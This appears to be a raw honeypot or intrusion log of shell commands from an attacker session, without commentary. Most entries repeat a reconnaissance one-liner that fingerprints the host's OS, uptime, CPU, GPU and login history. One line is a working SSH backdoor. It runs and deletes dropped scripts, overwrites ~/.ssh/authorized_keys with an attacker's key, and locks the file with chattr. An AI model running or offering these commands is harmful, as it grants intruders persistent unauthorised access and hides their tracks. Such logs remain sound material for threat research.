uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$((last | tail -n 10) || last);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
ls -la /
uname -s -m
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
uname=$(uname -s -v -n -m 2>/dev/null);; 		arch=$(uname -m 2>/dev/null);; 		uptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s="";if(d>0)s=s d"d";if(h>0){if(s!="")s=s", ";s=s h"h"}if(m>0||s==""){if(s!="")s=s", ";s=s m"m"}print s}' /proc/uptime 2>/dev/null);; 		[ -z "$uptime" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n "$secondsStr" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime="" && [ $d -gt 0 ] && uptime="${uptime}${d}d" && [ $h -gt 0 ] && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${h}h"; } && { [ $m -gt 0 ] || [ -z "$uptime" ]; } && { [ -n "$uptime" ] && uptime="$uptime, "; uptime="${uptime}${m}m"; };; 		cpus=$( (nproc || grep -c "^processor" /proc/cpuinfo) 2>/dev/null | head -1);; 		cpu_model=$( (grep -m1 "model name" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 "Model name" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; 		gpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n50);; 		cat_help=$((cat --help 2>&1 | tr '\n' ' ') || cat --help 2>&1);; 		ls_help=$((ls --help 2>&1 | tr '\n' ' ') || ls --help 2>&1);; 		last_output=$(last 2>/dev/null | head -n 10);; 		echo "UNAME:$uname";; 		echo "ARCH:$arch";; 		echo "UPTIME:$uptime";; 		echo "CPUS:$cpus";; 		echo "CPU_MODEL:$cpu_model";; 		echo "GPU:$gpu_info";; 		echo "CAT_HELP:$cat_help";; 		echo "LS_HELP:$ls_help";; 		echo "LAST:$last_output";
uname -s -v -n -m 2 > /dev/null
uname -m 2 > /dev/null
awk {u=int($1
cat /proc/uptime | cut -d -f1 | cut -d. -f1
(secondsStr
(seconds/86400
( (seconds%86400
(seconds%86400
( (seconds%3600
(seconds%3600
